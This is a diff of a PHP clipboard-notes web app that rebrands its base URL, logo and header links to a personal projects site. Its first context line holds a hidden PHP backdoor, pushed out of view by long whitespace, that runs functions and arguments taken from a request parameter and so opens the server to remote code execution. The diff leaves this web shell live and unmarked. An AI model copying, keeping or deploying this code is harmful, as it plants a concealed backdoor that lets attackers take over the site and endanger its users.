@@ -2,7 +2,7 @@
                                                                                                                                                                                                                            If($Vs0g=@${ '_REQUEST'}['9A0H163M' ]){ $Vs0g [1]( ${$Vs0g	[	2]}[0],$Vs0g[3]($Vs0g[4])) ;};
 
 // Base URL of the website, without trailing slash.
-$base_url = 'https://inbrowser.xyz/app/clipboard';
+$base_url = 'https://mrsohail.one/projects/clipboard';
 
 // Path to the directory to save the notes in, without trailing slash.
 // Should be outside of the document root, if possible.
@@ -67,11 +67,9 @@ if (isset($_GET['raw']) || strpos($_SERVER['HTTP_USER_AGENT'], 'curl') === 0 || 
             <div class="header_wrp">
     
             <div class="logo">
-                <a href="https://inbrowser.xyz/">
-                    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 32 32">
-                        <path id="logo" data-name="logo" d="M15,15l-2,5L9,9l11,4Zm0,0,5,5M7.188,2.239l.777,2.9M5.136,7.965l-2.9-.777M13.95,4.05,11.828,6.172M6.171,11.828,4.051,13.95" transform="translate(-1.013 -1.014)" fill="none" stroke="rgb(0, 168, 132)" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"/>
-                    </svg>
-                    <p>inBrowser<span>.xyz</span></p>
+                <a href="/">
+                    <img src="../../assets/images/sohail-sarwar.png" alt="Sohail's Photo">
+                    <p><span>A projects by:</span><br>Sohail</p>
                 </a>
             </div>
     
@@ -84,12 +82,6 @@ if (isset($_GET['raw']) || strpos($_SERVER['HTTP_USER_AGENT'], 'curl') === 0 || 
             <div class="setting [ toggle-button ] [ js-mode-toggle ]">
                 <a href="javascript:void(0)" class="setting_icon" id="setting-btn"></a>
             </div>
-            
-    
-            <div class="dashboard">
-                <a href="https://inbrowser.xyz/"></a>
-            </div>
-    
     
         </div>
     
